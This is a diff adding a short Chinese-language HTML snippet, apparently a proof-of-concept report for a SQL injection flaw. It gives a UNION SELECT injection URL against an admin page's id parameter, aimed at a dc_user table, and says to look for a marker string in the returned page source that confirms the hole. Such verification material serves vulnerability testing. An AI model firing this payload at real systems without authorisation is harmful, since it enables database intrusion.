@@ -1,0 +1,7 @@
+<meta charset="UTF-8">
+<div>
+    <h3>SQL注入URL: </h3>
+    <code>http://example.com/admin/index.php?id=-1 UNION SELECT 1,CONCAT(0x7165696a71,CAST(md5(23333) AS CHAR),0x20),3,4,5,6,7 FROM dc_user</code>
+    <h3>返回结果</h3>
+    <p>查看返回页面源码中是否有字符：qeijq0ba7bc92fcd57e337ebb9e74308c811f</p>
+</div>
